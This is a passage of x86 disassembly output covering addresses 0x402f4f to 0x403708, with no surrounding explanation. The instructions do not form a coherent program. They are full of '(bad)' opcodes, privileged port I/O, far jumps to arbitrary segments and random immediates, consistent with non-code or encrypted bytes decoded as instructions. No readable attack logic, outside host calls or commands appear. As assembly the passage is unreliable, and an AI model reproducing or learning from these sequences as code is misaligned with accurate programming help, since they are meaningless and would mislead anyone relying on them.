  402f4f:	cmp    esp,eax
  402f51:	in     al,dx
  402f52:	xor    DWORD PTR [eax],ebp
  402f54:	gs test al,0xaf
  402f57:	fmul   DWORD PTR [eax+0x7c824b6e]
  402f5d:	cmp    esi,DWORD PTR [eax+0x2e11db5]
  402f63:	aaa    
  402f64:	cdq    
  402f65:	in     eax,0x5f
  402f67:	or     ch,al
  402f69:	test   BYTE PTR [ebx],al
  402f6b:	stc    
  402f6c:	fld    QWORD PTR [edi-0x1d]
  402f6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f70:	scas   al,BYTE PTR es:[edi]
  402f71:	inc    ebx
  402f72:	jecxz  0x402f16
  402f74:	mov    ebx,0x778a287b
  402f79:	(bad)  
  402f7a:	cli    
  402f7b:	test   DWORD PTR [ebx],ebx
  402f7d:	inc    eax
  402f7e:	adc    edx,DWORD PTR ds:0xc8e431a7
  402f84:	mov    ds:0x2e554015,eax
  402f89:	(bad)  [edx+0xa353f42]
  402f8f:	jmp    0x17b809cd
  402f94:	add    bl,cl
  402f96:	xchg   edi,eax
  402f97:	sub    eax,0x4a44cf4b
  402f9c:	pop    ebx
  402f9d:	adc    BYTE PTR [edi+0x54],dl
  402fa0:	mov    eax,0x30f87097
  402fa5:	add    al,0x2f
  402fa7:	fcomip st,st(7)
  402fa9:	repnz cld 
  402fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fac:	push   cs
  402fad:	popa   
  402fae:	outs   dx,BYTE PTR ds:[esi]
  402faf:	xor    al,0xdf
  402fb1:	pop    ss
  402fb2:	out    0x9b,al
  402fb4:	sbb    eax,0xe8c7f2e8
  402fb9:	or     bh,BYTE PTR [edx+0x4f]
  402fbc:	add    eax,ecx
  402fbe:	out    dx,eax
  402fbf:	sub    DWORD PTR [ebp-0x3c59c0d0],ebp
  402fc5:	in     eax,dx
  402fc6:	popa   
  402fc7:	dec    esi
  402fc8:	imul   edi,DWORD PTR [ebx+0x12],0xaf5fa598
  402fcf:	sbb    BYTE PTR [ebp+eax*8-0x4b],bl
  402fd3:	xor    eax,0xea8314b2
  402fd8:	dec    edx
  402fd9:	in     eax,0xff
  402fdb:	xor    DWORD PTR [edx+edx*4+0x41],0x17
  402fe0:	pop    DWORD PTR [edi]
  402fe2:	jo     0x402fae
  402fe4:	dec    cl
  402fe6:	je     0x402fcb
  402fe8:	test   eax,0x6413c9dd
  402fed:	pop    eax
  402fee:	jbe    0x403049
  402ff0:	sub    BYTE PTR [edi],al
  402ff2:	or     al,0x4e
  402ff4:	mov    edi,DWORD PTR [ecx-0x44bb6a08]
  402ffa:	pop    ss
  402ffb:	ucomiss xmm0,DWORD PTR ds:0x565b57fb
  403002:	mov    esp,0x4f80d492
  403007:	in     eax,dx
  403008:	add    eax,0x824ce0f9
  40300d:	mov    ch,0x43
  40300f:	out    dx,eax
  403010:	icebp  
  403011:	xor    BYTE PTR [edi+edi*2-0xa],cl
  403015:	push   cs
  403016:	stos   DWORD PTR es:[edi],eax
  403017:	ins    DWORD PTR es:[edi],dx
  403018:	(bad)  
  403019:	and    al,0x6e
  40301b:	(bad)
  40301f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403020:	shl    DWORD PTR [edi-0x41],1
  403023:	std    
  403024:	sti    
  403025:	bound  esp,QWORD PTR [ebx-0x58]
  403028:	dec    edi
  403029:	jle    0x403044
  40302b:	dec    ebp
  40302c:	test   eax,0xe3575a2
  403031:	push   edi
  403032:	repz test eax,0xa5c32805
  403038:	test   eax,0xb86f4153
  40303d:	hlt    
  40303e:	aaa    
  40303f:	dec    ebx
  403040:	(bad)  
  403041:	fwait
  403042:	(bad)  
  403043:	inc    dl
  403045:	enter  0xe004,0xfc
  403049:	mov    ecx,0x90e551ba
  40304e:	cmc    
  40304f:	push   ebp
  403050:	(bad)  
  403051:	loope  0x4030c0
  403053:	or     ebp,DWORD PTR [esi+edx*8-0x6e9b2595]
  40305a:	push   ebx
  40305b:	mov    al,0x23
  40305d:	sub    ebp,DWORD PTR [ebx-0x10]
  403060:	in     al,0x94
  403062:	push   0xffffffb5
  403064:	mov    edx,0x5ced9865
  403069:	mov    DWORD PTR [ebp-0x7f5e9f9e],ecx
  40306f:	mov    ebx,0x2ec2f44f
  403074:	sub    bl,BYTE PTR [edi]
  403076:	into   
  403077:	imul   esp,edx,0x6b326899
  40307d:	jmp    DWORD PTR [ecx+edx*8]
  403080:	hlt    
  403081:	xlat   BYTE PTR ds:[ebx]
  403082:	mov    esi,0x84720083
  403087:	arpl   WORD PTR [ebx+0x77869d09],di
  40308d:	mov    dl,0x60
  40308f:	dec    DWORD PTR [esi+0x31bf6f25]
  403095:	dec    ebp
  403096:	jg     0x403097
  403098:	js     0x40305d
  40309a:	(bad)  
  40309b:	ror    BYTE PTR [ebx+0x1d],1
  40309e:	jmp    0x7d65:0xc811c6ef
  4030a5:	inc    ebx
  4030a6:	scas   eax,DWORD PTR es:[edi]
  4030a7:	lds    esi,FWORD PTR ss:[edx-0x5b7f0bb6]
  4030ae:	test   DWORD PTR [ecx+0x6a7d6308],esp
  4030b4:	inc    ebp
  4030b5:	or     ah,bh
  4030b7:	inc    ecx
  4030b8:	addps  xmm2,XMMWORD PTR [ebp-0x567afe9]
  4030bf:	mov    al,0x27
  4030c1:	inc    eax
  4030c2:	push   ebp
  4030c3:	cli    
  4030c4:	enter  0xb841,0xaa
  4030c8:	pop    ebp
  4030c9:	xor    edx,DWORD PTR [edi]
  4030cb:	and    DWORD PTR [edi+0x59f4c45b],eax
  4030d1:	leave  
  4030d2:	xchg   ebx,eax
  4030d3:	cmc    
  4030d4:	bound  edi,QWORD PTR [ebx+0x7d]
  4030d7:	(bad)  
  4030d8:	push   esi
  4030d9:	cdq    
  4030da:	mov    ds:0x6f684e74,eax
  4030df:	xchg   ebx,eax
  4030e0:	jo     0x403074
  4030e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030e4:	cmp    bl,BYTE PTR [ecx-0x1000c3a3]
  4030ea:	jno    0x403087
  4030ec:	jg     0x403163
  4030ee:	aas    
  4030ef:	mov    edi,DWORD PTR [edi]
  4030f1:	nop
  4030f2:	push   esp
  4030f3:	and    DWORD PTR [edi],esi
  4030f5:	jg     0x4030f0
  4030f7:	dec    eax
  4030f8:	(bad)  
  4030f9:	les    ebp,FWORD PTR [eax]
  4030fb:	ficomp DWORD PTR ds:0x8fc5d8bc
  403101:	sub    BYTE PTR [edi+0x2c5eb30],al
  403107:	ficom  DWORD PTR [eax+0x22]
  40310a:	aad    0x2b
  40310c:	pop    ebp
  40310d:	pop    es
  40310e:	mov    dl,0x88
  403110:	adc    DWORD PTR [eax],eax
  403112:	jo     0x40318c
  403114:	inc    edx
  403115:	dec    esp
  403116:	pop    ds
  403117:	jle    0x4030d5
  403119:	adc    eax,0x540c11b4
  40311e:	mov    ch,ch
  403120:	aas    
  403121:	xor    esi,ebp
  403123:	xchg   esp,eax
  403124:	add    al,0x3c
  403126:	rol    dl,0xc0
  403129:	(bad)  
  40312a:	xor    al,0xe6
  40312c:	jge    0x403174
  40312e:	push   eax
  40312f:	dec    ebp
  403130:	mov    dl,dl
  403132:	shl    BYTE PTR [ecx+eax*2+0xf],0x4
  403137:	xor    eax,0xe8f3845e
  40313c:	test   eax,0x1cf60660
  403141:	hlt    
  403142:	lods   al,BYTE PTR ds:[esi]
  403143:	mov    BYTE PTR [ebp+0x5f],ah
  403146:	aaa    
  403147:	outs   dx,BYTE PTR ds:[esi]
  403148:	dec    DWORD PTR [ecx-0x44]
  40314b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40314c:	and    DWORD PTR [ecx-0x38],ebx
  40314f:	push   es
  403150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403151:	inc    eax
  403152:	scas   al,BYTE PTR es:[edi]
  403153:	sti    
  403154:	je     0x403165
  403156:	je     0x4030e8
  403158:	popf   
  403159:	mov    ebp,0x3bd1b49f
  40315e:	xchg   edx,eax
  40315f:	mov    ebp,0xa09af74e
  403164:	and    edx,DWORD PTR [ebx-0x6c]
  403167:	out    0xd0,al
  403169:	xchg   edi,eax
  40316a:	mov    cl,0x53
  40316c:	jns    0x403172
  40316e:	cdq    
  40316f:	cmc    
  403170:	mov    ebx,0x9168355d
  403175:	stos   DWORD PTR es:[edi],eax
  403176:	fnstsw WORD PTR [esi+0x25]
  403179:	or     eax,0xd5baf57
  40317e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40317f:	mov    edi,0x1dc16d49
  403184:	push   DWORD PTR [ecx-0x3d]
  403187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403189:	es xor al,0xec
  40318c:	into   
  40318d:	sbb    ch,BYTE PTR [ecx-0x4072898b]
  403193:	jmp    0xa004e1bf
  403198:	ret    
  403199:	mov    cl,0x23
  40319b:	icebp  
  40319c:	push   esp
  40319d:	js     0x4031da
  40319f:	dec    ecx
  4031a0:	arpl   si,bp
  4031a2:	and    ch,ah
  4031a4:	sub    bl,BYTE PTR [edi-0x54]
  4031a7:	jne    0x40317d
  4031a9:	in     al,dx
  4031aa:	mov    al,ds:0x41f8b992
  4031af:	arpl   WORD PTR [edi],si
  4031b1:	mov    ebp,0xf08fbed
  4031b6:	sub    BYTE PTR [eax],ah
  4031b8:	add    eax,0x9e8a9c16
  4031bd:	sub    al,0xed
  4031bf:	inc    edx
  4031c0:	ret    0x2b4e
  4031c3:	sti    
  4031c4:	fcomp  DWORD PTR [esi]
  4031c6:	inc    eax
  4031c7:	les    ebp,FWORD PTR [ebp-0x13]
  4031ca:	not    DWORD PTR [esi+0x69c15699]
  4031d0:	(bad)  
  4031d2:	rcr    DWORD PTR [ecx-0x45e51bab],1
  4031d8:	(bad)  
  4031d9:	mov    cl,0x43
  4031db:	je     0x403170
  4031dd:	dec    ebp
  4031de:	xlat   BYTE PTR ds:[ebx]
  4031df:	ds out 0xb9,eax
  4031e2:	add    dh,bh
  4031e4:	stc    
  4031e5:	pop    es
  4031e6:	enter  0x2e18,0xb2
  4031ea:	mov    ecx,0x1b072ede
  4031ef:	ss cmp eax,0x1e856d92
  4031f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031f6:	pop    esp
  4031f7:	push   edi
  4031f8:	and    al,0x96
  4031fa:	lods   al,BYTE PTR ds:[esi]
  4031fb:	add    al,0xcb
  4031fd:	fwait
  4031fe:	xor    cl,BYTE PTR [ebx+eiz*1-0x77]
  403202:	js     0x40318a
  403204:	mov    ebx,0xbab042df
  403209:	mov    ds:0xe3c623c6,al
  40320e:	arpl   WORD PTR [edx],si
  403210:	jmp    0xf305fcc8
  403215:	mov    dl,0x75
  403217:	mov    ebx,ecx
  403219:	in     eax,0xf8
  40321b:	sti    
  40321c:	sub    eax,0x330a6f6d
  403221:	stos   DWORD PTR es:[edi],eax
  403222:	jmp    0xad2f:0xb6558b0b
  403229:	iret   
  40322a:	stos   BYTE PTR es:[edi],al
  40322b:	push   ebx
  40322c:	sbb    DWORD PTR [edx+0x89a1a37],ecx
  403232:	in     eax,dx
  403233:	xor    eax,0x2f1abd72
  403238:	jg     0x40324d
  40323a:	or     ah,BYTE PTR [edx+edi*2]
  40323d:	int    0xb8
  40323f:	stos   BYTE PTR es:[edi],al
  403240:	or     ecx,eax
  403242:	push   es
  403243:	call   0x39e1b0c3
  403248:	lods   al,BYTE PTR ds:[esi]
  403249:	inc    ecx
  40324a:	test   DWORD PTR [esi],edx
  40324c:	pushf  
  40324d:	adc    eax,DWORD PTR [eax-0x26]
  403250:	dec    esi
  403251:	es mov dh,0xd7
  403254:	jmp    0xecad2f23
  403259:	mov    esi,0x3495cc38
  40325e:	dec    edx
  40325f:	and    BYTE PTR [edi],ah
  403261:	fwait
  403262:	imul   BYTE PTR [edx]
  403264:	repnz push ecx
  403266:	jno    0x403205
  403268:	call   0xc71d:0x88122ae8
  40326f:	cmc    
  403270:	jnp    0x40324f
  403272:	mov    ss,WORD PTR [ecx]
  403274:	sar    BYTE PTR [ecx],cl
  403276:	mov    bh,0x9a
  403278:	sbb    eax,ecx
  40327a:	or     BYTE PTR [ecx+0x46],0xc0
  40327e:	add    BYTE PTR [esi+0x7],cl
  403281:	fist   WORD PTR [ebx+0x1b7af0de]
  403287:	jnp    0x403308
  403289:	lahf   
  40328a:	xlat   BYTE PTR ds:[ebx]
  40328b:	add    BYTE PTR [esi+0x2f],ch
  40328e:	push   ebp
  40328f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403290:	dec    ecx
  403291:	(bad)  
  403292:	jae    0x403310
  403294:	cmp    eax,0xbf97e61d
  403299:	xchg   ecx,eax
  40329a:	ror    BYTE PTR [ecx+ebp*8+0x723a3b03],cl
  4032a1:	sti    
  4032a2:	dec    edx
  4032a3:	add    bl,al
  4032a5:	pop    ecx
  4032a6:	clc    
  4032a7:	bnd jge 0x403234
  4032aa:	das    
  4032ab:	and    DWORD PTR [ebx+0x6992c290],edi
  4032b1:	or     al,0xa3
  4032b4:	lahf   
  4032b5:	mov    bl,0x2b
  4032b7:	pop    ecx
  4032b8:	jbe    0x403329
  4032ba:	jnp    0x403329
  4032bc:	or     al,0xbc
  4032be:	xor    DWORD PTR [ecx+0x3d5cb54],edi
  4032c4:	(bad)  
  4032c5:	in     al,dx
  4032c6:	adc    edx,DWORD PTR [ecx-0x5fbd2f66]
  4032cc:	jno    0x403336
  4032ce:	ret    0x244d
  4032d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032d2:	or     eax,0xaea0b6a2
  4032d7:	xchg   edx,eax
  4032d8:	add    eax,0x71347e84
  4032dd:	(bad)  
  4032de:	lea    ebp,[esi]
  4032e0:	xor    al,0x96
  4032e2:	retf   
  4032e3:	and    DWORD PTR [edx-0x63e658a1],ebx
  4032e9:	loop   0x40334a
  4032eb:	fstp   DWORD PTR [esi*2+0x6896e6d2]
  4032f2:	xor    BYTE PTR [edi+0x2d],bh
  4032f5:	dec    edi
  4032f6:	sahf   
  4032f7:	and    al,0xcf
  4032f9:	test   al,0xc7
  4032fb:	adc    cl,BYTE PTR [esi-0x7269bdad]
  403301:	or     al,0xa9
  403303:	sub    eax,0x6c6a5a0a
  403308:	je     0x403384
  40330a:	or     dh,BYTE PTR [esi]
  40330c:	xor    ch,al
  40330e:	ins    DWORD PTR es:[edi],dx
  40330f:	cld    
  403310:	je     0x4032ee
  403312:	jb     0x4032b0
  403314:	dec    BYTE PTR [eax+ebx*2+0x78341572]
  40331b:	in     eax,dx
  40331c:	(bad)  
  40331d:	mov    eax,DWORD PTR [ebx+0x6a]
  403320:	arpl   WORD PTR [ebx-0x8],si
  403323:	dec    ebp
  403324:	inc    edx
  403325:	loop   0x40330c
  403327:	xor    al,0x9c
  403329:	stc    
  40332a:	pop    esi
  40332b:	jb     0x40337d
  40332d:	ror    BYTE PTR [ebp+eiz*1-0x56],cl
  403331:	and    BYTE PTR [ebp+0x3e7a925a],dh
  403337:	jg     0x40337c
  403339:	stos   DWORD PTR es:[edi],eax
  40333a:	aas    
  40333b:	js     0x4032e7
  40333d:	out    dx,eax
  40333e:	xchg   ecx,eax
  40333f:	adc    ah,BYTE PTR [ebp+0x39]
  403342:	inc    esp
  403343:	adc    eax,0x8b1f6101
  403348:	sahf   
  403349:	sbb    esp,DWORD PTR [bp-0x47]
  40334d:	sub    dh,BYTE PTR [edi+0x58]
  403350:	mov    eax,DWORD PTR [edx+0x4acfcbfd]
  403356:	mov    eax,0xa27090e1
  40335b:	js     0x403399
  40335d:	or     al,0xe2
  40335f:	shl    BYTE PTR [eax-0x3f761871],1
  403365:	loop   0x403354
  403367:	leave  
  403368:	xchg   esi,ecx
  40336a:	fistp  QWORD PTR [edx+ebx*1-0x50]
  40336e:	lea    ebp,[ebx*1+0x61b0d426]
  403375:	sub    eax,0xbf297610
  40337a:	mov    ah,0x2
  40337c:	push   ebp
  40337d:	ja     0x403396
  40337f:	pop    esp
  403380:	push   0x225453e4
  403385:	stos   BYTE PTR es:[edi],al
  403386:	jbe    0x4033ab
  403388:	cmp    DWORD PTR [ecx+0x2b3cdee3],0x1d
  40338f:	or     DWORD PTR [ebp-0x92e8f24],ecx
  403395:	shl    DWORD PTR [eax],1
  403397:	lds    edi,FWORD PTR [eax]
  403399:	dec    ebp
  40339a:	sbb    DWORD PTR [ecx],edx
  40339c:	fs inc esp
  40339e:	js     0x403392
  4033a0:	stos   DWORD PTR es:[edi],eax
  4033a1:	mov    dl,0x1f
  4033a3:	push   ecx
  4033a4:	dec    esp
  4033a5:	adc    ah,dh
  4033a7:	push   eax
  4033a8:	pop    edi
  4033a9:	xor    eax,0xa12bed8e
  4033ae:	mov    ch,0xc9
  4033b0:	stos   BYTE PTR es:[edi],al
  4033b1:	mov    esi,0x7e222d42
  4033b6:	mov    DWORD PTR [edx+0x14dc580a],eax
  4033bc:	mul    DWORD PTR [ebp-0x7ffb8954]
  4033c2:	pop    eax
  4033c3:	sub    DWORD PTR [ecx],esp
  4033c5:	mul    DWORD PTR ds:0x74c8b36d
  4033cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033cc:	push   es
  4033cd:	adc    BYTE PTR [ebx-0x47],ch
  4033d0:	pop    eax
  4033d1:	test   al,0x83
  4033d3:	jle    0x403398
  4033d5:	ret    0xdc11
  4033d8:	fsubr  DWORD PTR [eax+0x33a2c909]
  4033de:	jns    0x403444
  4033e0:	pop    ss
  4033e1:	repz hlt 
  4033e3:	test   eax,0xa3d0da85
  4033e8:	addr16 xchg ebp,eax
  4033ea:	jb     0x4033f0
  4033ec:	and    DWORD PTR [eax],0xffffff9f
  4033ef:	mov    al,0xf6
  4033f1:	aas    
  4033f2:	ins    DWORD PTR es:[edi],dx
  4033f3:	cs (bad) 
  4033f5:	sar    dl,1
  4033f7:	outs   dx,DWORD PTR ds:[esi]
  4033f8:	jae    0x4033d0
  4033fa:	lock lods eax,DWORD PTR ds:[esi]
  4033fc:	jle    0x403429
  4033fe:	jo     0x403405
  403400:	int    0xc4
  403402:	pop    ss
  403403:	jmp    0x768f:0x562f4a9a
  40340a:	sahf   
  40340b:	aam    0xb7
  40340d:	adc    BYTE PTR [ecx-0xd],bl
  403410:	sub    esp,DWORD PTR [ebp+esi*8+0x75]
  403414:	xchg   BYTE PTR ds:0x31e3abc8,bh
  40341a:	sbb    al,0x18
  40341c:	daa    
  40341d:	rol    DWORD PTR [edi-0x4fd55820],1
  403423:	nop
  403424:	in     al,dx
  403425:	mov    WORD PTR [edi-0x3dd96531],?
  40342b:	cmp    al,ah
  40342d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40342e:	outs   dx,BYTE PTR ds:[esi]
  40342f:	jmp    0x3546:0x7280a288
  403436:	idiv   BYTE PTR [edx+0x78089ef0]
  40343c:	xchg   DWORD PTR [esp+esi*8-0x2e],ebx
  403440:	mov    dl,0xeb
  403442:	jge    0x403403
  403444:	pop    esp
  403445:	repz test DWORD PTR [ecx+ebp*8+0x32],ebp
  40344a:	sti    
  40344b:	jb     0x403491
  40344d:	(bad)  
  40344f:	cmp    DWORD PTR [ecx+0x36d71410],edi
  403455:	jg     0x403471
  403457:	loop   0x4034c3
  403459:	or     BYTE PTR [esi+edx*1-0x6bdfe65d],dh
  403460:	and    edi,edi
  403462:	inc    edi
  403463:	mov    dl,0xbd
  403465:	push   0x17dd051d
  40346a:	dec    eax
  40346b:	ja     0x40345b
  40346d:	in     al,0xb7
  40346f:	clc    
  403470:	dec    BYTE PTR [edx]
  403472:	cmc    
  403473:	fcom   DWORD PTR [ebx-0x3de72c77]
  403479:	mov    cl,0xfb
  40347b:	shr    DWORD PTR [ebx+0xec57f],1
  403481:	cwde   
  403482:	shr    DWORD PTR [ebp+0x4d],0xa
  403486:	jne    0x403497
  403488:	mov    bl,0x7f
  40348a:	rol    BYTE PTR [edx],0x22
  40348d:	or     esp,DWORD PTR [eax-0x7e0ec5c1]
  403493:	add    DWORD PTR [edi-0x14b15c8d],edi
  403499:	sub    al,cl
  40349b:	push   es
  40349c:	test   ebp,edi
  40349e:	clc    
  40349f:	aas    
  4034a0:	xchg   esi,eax
  4034a1:	adc    BYTE PTR es:[edi-0x6b],bh
  4034a5:	imul   ebx,esp,0xc55975e9
  4034ab:	jmp    0x4034a8
  4034ad:	jae    0x4034af
  4034af:	jmp    0xe3948d4f
  4034b4:	nop
  4034b5:	inc    ebp
  4034b6:	mov    eax,0xc8610912
  4034bb:	(bad)  
  4034bc:	sub    al,0x3d
  4034be:	add    al,0x6a
  4034c0:	cmp    BYTE PTR [ecx-0x44],cl
  4034c3:	mov    eax,ds:0x30b31bfb
  4034c8:	or     ch,BYTE PTR [esi+0x2fc3c640]
  4034ce:	(bad)  
  4034cf:	repz jb 0x4034dc
  4034d2:	in     eax,dx
  4034d3:	fimul  DWORD PTR [eax+0x6c]
  4034d6:	fiadd  WORD PTR ds:0x6c9417d5
  4034dc:	outs   dx,DWORD PTR ds:[esi]
  4034dd:	and    DWORD PTR [ebx-0x21],ecx
  4034e0:	mov    WORD PTR [esi+edx*4+0x73],fs
  4034e4:	test   BYTE PTR [edi],0x2
  4034e7:	or     eax,0xddedbf94
  4034ec:	leave  
  4034ed:	adc    dh,BYTE PTR [esi+0x522d6d2f]
  4034f3:	ins    DWORD PTR es:[edi],dx
  4034f4:	fidiv  DWORD PTR [ebx+0x73b72ad6]
  4034fa:	mov    ds:0xf3425501,eax
  4034ff:	je     0x403575
  403501:	popa   
  403502:	popf   
  403503:	aad    0x22
  403505:	rcl    DWORD PTR [ebx],cl
  403507:	ror    DWORD PTR [ebp+0x5f],cl
  40350a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40350b:	not    BYTE PTR [ebx+0x5d]
  40350e:	(bad)  
  40350f:	mov    al,0xd6
  403511:	shl    DWORD PTR [ebp+0x5d],1
  403514:	cmp    DWORD PTR ds:0xf87ac9a0,ecx
  40351a:	bound  esp,QWORD PTR [ecx+0x7f]
  40351d:	lahf   
  40351e:	pop    esp
  40351f:	mov    ebx,0x902622f4
  403524:	inc    edi
  403525:	mov    edi,0x8bbf4dbf
  40352a:	dec    eax
  40352b:	sbb    eax,0x4fd2d2e4
  403530:	adc    bl,dh
  403532:	sub    esi,ecx
  403534:	jns    0x4034da
  403536:	sahf   
  403537:	and    bl,BYTE PTR [edi]
  403539:	add    al,BYTE PTR cs:[esi]
  40353c:	aas    
  40353d:	sahf   
  40353e:	std    
  40353f:	dec    ecx
  403540:	xchg   ecx,eax
  403541:	cmp    eax,0x94e8cc15
  403546:	sti    
  403547:	lds    ebx,FWORD PTR [ecx+0x4c]
  40354a:	sub    ah,dh
  40354c:	(bad)  
  40354d:	outs   dx,DWORD PTR ds:[si]
  40354f:	in     al,0x17
  403551:	lods   eax,DWORD PTR ds:[esi]
  403552:	js     0x40356b
  403554:	fstp   TBYTE PTR [ebx-0x75]
  403557:	aas    
  403558:	push   es
  403559:	test   al,0xe8
  40355b:	push   cs
  40355c:	(bad)  
  40355e:	xor    ch,BYTE PTR [ebp-0x22]
  403561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403562:	jae    0x40352e
  403564:	rcl    DWORD PTR [esi+edx*1],cl
  403567:	and    al,0x1c
  403569:	mov    dh,0xf
  40356b:	(bad)  
  40356c:	xor    dh,dl
  40356e:	push   esp
  40356f:	clc    
  403570:	fbld   TBYTE PTR [edi+0x347a9fe9]
  403576:	aad    0x87
  403578:	inc    ecx
  403579:	(bad)  
  40357b:	adc    DWORD PTR [esi+edi*8-0x12],ecx
  40357f:	ja     0x4035ee
  403581:	dec    edx
  403582:	dec    esi
  403583:	fwait
  403584:	xchg   BYTE PTR [eax+esi*4-0x32aac054],ah
  40358b:	ds fcmove st,st(1)
  40358e:	and    eax,0x395dda65
  403593:	xlat   BYTE PTR ds:[ebx]
  403594:	int3   
  403595:	repz mov eax,ds:0x397a3329
  40359b:	and    BYTE PTR [edi+0x1b8352ca],0x1
  4035a2:	or     DWORD PTR [ecx-0xf],edi
  4035a5:	mov    ebp,0x9bac1f1
  4035aa:	sbb    edi,DWORD PTR [eax+ebp*8]
  4035ad:	mov    ecx,0x2cbe1a3c
  4035b2:	mov    DWORD PTR ds:0x785fe4f4,ebp
  4035b8:	push   edx
  4035b9:	mov    dl,0xa
  4035bb:	mov    ds:0x82504874,eax
  4035c0:	push   esp
  4035c1:	popa   
  4035c2:	pop    ss
  4035c3:	cwde   
  4035c4:	ins    DWORD PTR es:[edi],dx
  4035c5:	push   es
  4035c6:	xchg   dh,al
  4035c8:	cvtpi2ps xmm4,QWORD PTR [ebx-0x1854dad7]
  4035cf:	mov    ch,0x1e
  4035d1:	or     BYTE PTR [edi+edi*4],al
  4035d4:	xchg   BYTE PTR [eax-0x30cf569d],bl
  4035da:	loope  0x403590
  4035dc:	push   ebp
  4035dd:	xlat   BYTE PTR ds:[ebx]
  4035de:	xchg   esp,eax
  4035df:	lds    esi,FWORD PTR [ecx]
  4035e1:	repz adc eax,0x3e94e4f4
  4035e7:	add    al,0x5a
  4035e9:	pop    ds
  4035ea:	aam    0xb1
  4035ec:	mov    dh,0x66
  4035ee:	jbe    0x403581
  4035f0:	loopne 0x40364d
  4035f2:	jg     0x403649
  4035f4:	inc    eax
  4035f5:	ds scas eax,DWORD PTR es:[edi]
  4035f7:	push   0xffffffa8
  4035f9:	or     DWORD PTR [ebp-0xf],esp
  4035fc:	nop
  4035fd:	jge    0x403645
  4035ff:	and    eax,0xc5e50b96
  403604:	stc    
  403605:	outs   dx,DWORD PTR ds:[esi]
  403606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403607:	ins    BYTE PTR es:[edi],dx
  403608:	call   0xc944:0x259c49d
  40360f:	mov    esi,0x285ecac0
  403614:	push   ebx
  403615:	xor    BYTE PTR [edx],0x9a
  403618:	inc    esp
  403619:	mov    ch,0xf4
  40361b:	fmulp  st(2),st
  40361d:	mov    ecx,DWORD PTR [edi+0x2f]
  403620:	(bad)  
  403622:	int3   
  403623:	add    ah,ah
  403625:	fwait
  403626:	mov    ebp,0xe4355147
  40362b:	and    BYTE PTR [eax+0x74835204],al
  403631:	stos   DWORD PTR es:[edi],eax
  403632:	cmp    eax,0xfb9dc834
  403637:	xchg   edi,eax
  403638:	or     DWORD PTR [eax],esp
  40363a:	mov    WORD PTR [ebx-0x57],ds
  40363d:	daa    
  40363e:	cmp    eax,0x3574366
  403643:	(bad)  
  403644:	loop   0x4036c0
  403646:	mov    ds:0x74a17f6d,al
  40364b:	mov    cl,0x45
  40364d:	dec    ecx
  40364e:	xor    eax,0x710f4ad9
  403653:	jo     0x403636
  403655:	loopne 0x4035e6
  403657:	push   ds
  403658:	mul    BYTE PTR [esi+0x3b15b7c3]
  40365e:	xchg   edi,eax
  40365f:	inc    eax
  403660:	ins    DWORD PTR es:[edi],dx
  403661:	fild   QWORD PTR [ecx+0x3d]
  403664:	xor    BYTE PTR [eax-0x48],dl
  403667:	rcl    di,cl
  40366a:	pushf  
  40366b:	fdivr  QWORD PTR [eax+eiz*8+0x3d881da9]
  403672:	xor    eax,0x8901b768
  403677:	stos   DWORD PTR es:[edi],eax
  403678:	mov    bh,0x8a
  40367a:	push   ds
  40367b:	jecxz  0x403683
  40367d:	(bad)  
  40367e:	pusha  
  40367f:	(bad)  
  403680:	std    
  403681:	pop    ecx
  403682:	pop    edx
  403683:	and    BYTE PTR [edx+0x41],ah
  403686:	inc    edi
  403688:	out    dx,al
  403689:	clc    
  40368a:	mov    cs,WORD PTR [esi-0x256d44ed]
  403690:	mov    edi,0x675015ed
  403695:	ss int3 
  403697:	jmp    0x46857b1c
  40369c:	retf   0xee40
  40369f:	lea    ebx,[eax]
  4036a1:	xchg   edi,eax
  4036a2:	shl    DWORD PTR [edx],cl
  4036a4:	pop    ds
  4036a5:	cmp    BYTE PTR [eax-0x2a],dh
  4036a8:	shl    dl,1
  4036aa:	(bad)  
  4036ab:	cli    
  4036ac:	out    0x56,al
  4036ae:	mov    ebp,0x644cbb
  4036b3:	push   edx
  4036b4:	xchg   ecx,eax
  4036b5:	or     DWORD PTR [ebp+0x74],0x454e0fcc
  4036bc:	push   ecx
  4036bd:	out    0xb3,al
  4036bf:	loope  0x4036fa
  4036c1:	or     eax,0xc798b762
  4036c6:	aas    
  4036c7:	xor    BYTE PTR [ecx],ah
  4036c9:	ds xor al,0xe3
  4036cc:	mov    cl,0x83
  4036ce:	lock aas 
  4036d0:	mov    edx,0xd6278bdd
  4036d5:	xchg   esp,eax
  4036d6:	sbb    DWORD PTR [eax+0x40],esp
  4036d9:	rcl    edx,cl
  4036db:	push   ebx
  4036dc:	push   ds
  4036dd:	clc    
  4036de:	and    al,0x5b
  4036e0:	pop    ebx
  4036e1:	fiadd  DWORD PTR [edx-0x4d]
  4036e4:	pop    ecx
  4036e5:	mov    ebx,0x2f7179d
  4036ea:	es (bad) 
  4036ec:	mov    ebp,0x22a4baf5
  4036f1:	daa    
  4036f2:	iret   
  4036f3:	cdq    
  4036f4:	add    ch,bl
  4036f6:	mov    ebp,0x74df54ef
  4036fb:	xchg   ebp,eax
  4036fc:	stos   DWORD PTR es:[edi],eax
  4036fd:	scas   al,BYTE PTR es:[edi]
  4036fe:	(bad)  
  4036ff:	jle    0x4036da
  403701:	sub    al,BYTE PTR [eax+0x3c]
  403704:	cmp    BYTE PTR [ecx],0x10
  403707:	pop    ds
  403708:	sub    al,0x52
